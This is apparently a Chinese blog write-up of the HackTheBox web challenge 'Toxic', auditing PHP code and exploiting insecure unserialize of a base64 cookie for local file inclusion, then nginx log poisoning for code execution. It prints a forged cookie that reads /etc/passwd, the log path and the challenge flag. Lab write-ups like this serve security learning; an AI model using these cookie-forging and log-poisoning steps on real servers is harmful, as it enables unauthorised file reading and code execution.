---
title: "ichigo ichie-第一期-web-HTB-Toxic"
slug: "ichigo-ichie-ep1-web-htb-toxic"
date: 2023-06-05T18:42:49+08:00
tags: ["web", "CTF", "HTB"]
aliases:
  - /SU15VTE/47e4f81b.html
  - /SU15VTE/47e4f81b
image: img/daliy.jpg
---

# 导言

> いちごいちえ
>
> ichigo ichie(いちごいちえ)，"一期一会"的概念源自于茶道的精神，茶道强调的是以细致入微的态度对待每一次茶会，每次茶会都是独特的，与他人相遇的机会是有限的，所以要以全身心的专注和感恩的心态来对待。这个概念也可以应用到生活的其他方面，提醒我们要珍惜与他人的相遇、体验和交流，不论是工作中的会议、与朋友的聚会还是与家人的相处，都应该以珍贵和特殊的心态去对待，体验当下的美好。而在CTF中，我相信每个挑战和每次比赛都是独特且珍贵的经历。本篇文章是这个栏目的第一期，我相信每个人都有自己独特的CTF之旅，而每一次挑战都是一次成长和学习的机会。我希望能够鼓励和激励大家不断探索、学习和成长，在这个充满挑战和创造力的领域中取得更多的成就。

# 解题过程

## 代码审计

来自HTB上的一道Web题，我们先对其进行代码审计\
![img](/SU15VTE/47e4f81b/%E9%A2%98%E7%9B%AE%E4%BB%8B%E7%BB%8D.png)

查看源码我们可以发现这是一个PHP的Challenge,代码很少，我们只需要审计index.php和models/PageModel.php这两个文件即可。

``` bash
.
├── index.html
├── index.php
├── models
│   └── PageModel.php
└── static
    ├── basement
    │   └── help.png
    ├── css
    │   └── production.css
    ├── images
    │   ├── aircraft.svg
    │   ├── ...
    │   └── zopim.svg
    └── js
        └── production.js
```

那么让我们先来看看PageModel.php吧。

``` php
file);
    }
}
```

可以看到PageModel是一个类，他包含\$file这个属性，\_\_destruct()函数在对象销毁时会被自动调用，会加载我们的\$file。

``` php
file = '/www/index.html';

    setcookie(
        'PHPSESSID', 
        base64_encode(serialize($page)), 
        time()+60*60*24, 
        '/'
    );
} 

$cookie = base64_decode($_COOKIE['PHPSESSID']);
unserialize($cookie);
```

接下来让我们看看index.php，可以看到当没有 **PHPSESSID** 这个cookie传入时，就会序列化一个初始的\$page,\$page是PageModel实例化出来的一个对象，他让我们加载/www/index.html这个文件，我们可以通过修改cookie来让我们读取任意文件，这是一个LFI（Local File Inclusion）漏洞，而这个程序在生成和读取cookie时，只是经历了简单的Base64编码，没有加密，我们可以实例化一个PageModel的对象让我们读取到任意的文件。

``` php
file);
    }
}
    $page = new PageModel;
    $page->file = '/etc/passwd';        //你要读取的文件目录
    echo base64_encode(serialize($page));
    //print `Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2V0Yy9wYXNzd2QiO30=`
```

## 验证LFI漏洞

让我们用上面的cookie验证一下LFI吧，可以看到我们读取到了/etc/passwd这文件。\
![img](/SU15VTE/47e4f81b/LFI.png)\
在我们可以进行任意文件读取时，我们就可以直接读取Flag了，但是我们可以看到entrypoint.sh这个文件对flag的命名进行了更改

``` bash
#!/bin/ash

# Secure entrypoint
chmod 600 /entrypoint.sh

# Generate random flag filename
mv /flag /flag_`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1`

exec "$@"
```

随机字符串的长度是5，由大小写字母和数字组成。组合数量是62 \*\* 5 = 916,132,832，如果我们要暴力破解的话，我们需要进行9亿多次的尝试才有可能找到与目标文件名相匹配的随机字符串。因此暴力破解这个办法是行不通的。

## 利用日志的LFI达成RCE

我们在配置文件下可以找到日志的目录：

```
...
    server_tokens off;
    log_format docker '$remote_addr $remote_user $status "$request" "$http_referer" "$http_user_agent" ';
    access_log /var/log/nginx/access.log docker;

    charset utf-8;
    keepalive_timeout 20s;
    sendfile on;
    tcp_nopush on;
    client_max_body_size 1M;

    include  /etc/nginx/mime.types;
...
```

我们把上面代码中\$file改成：/var/log/nginx/access.log，我们可以获取一个可以读取到日志的Cookie：Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==，我们利用这个Cookie来读取日志。

而当我们对网页发起请求时，我们请求的内容会被写入到日志中。而日志没有进行过滤，我们可以将我们的恶意代码插入我们的请求中。

```
GET /aaaa HTTP/1.1
Host: 165.22.113.109:30700
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://165.22.113.109:30700/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9
Connection: close
```

在发送完这个请求后，我们再访问日志文件，可以发现我们的代码被执行了，可以在日志中读取到执行记录，RCE达成。\
![PNG](/SU15VTE/47e4f81b/RCE.png)\
利用漏洞获取flag的filename,然后读取flag。\
![PNG](/SU15VTE/47e4f81b/ls.png)\
![PNG](/SU15VTE/47e4f81b/flag.png)\
Flag: **HTB{P0i5on_1n_Cyb3r_W4rF4R3?!}**
